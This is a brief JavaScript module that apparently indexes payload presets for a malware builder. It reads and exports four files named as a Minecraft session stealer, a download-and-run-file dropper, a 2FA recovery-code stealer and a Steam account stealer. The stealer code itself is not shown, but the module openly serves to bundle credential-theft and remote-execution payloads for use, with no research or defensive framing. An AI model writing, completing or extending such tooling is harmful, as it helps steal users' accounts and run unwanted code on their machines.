const fs = require('fs');

module.exports = {
    minecraft_session_stealer: fs.readFileSync(__dirname + '/./presets/minecraft_session_stealer.js', 'utf8'),
    download_and_run_file: fs.readFileSync(__dirname + '/./presets/download_and_run_file.js', 'utf8'),
    cosmic_2fa_recovery_stealer: fs.readFileSync(__dirname + '/./presets/cosmic_2fa_recovery_stealer.js', 'utf8'),
    steam_account_stealer: fs.readFileSync(__dirname + '/./presets/steam_account_stealer.js', 'utf8'),
};
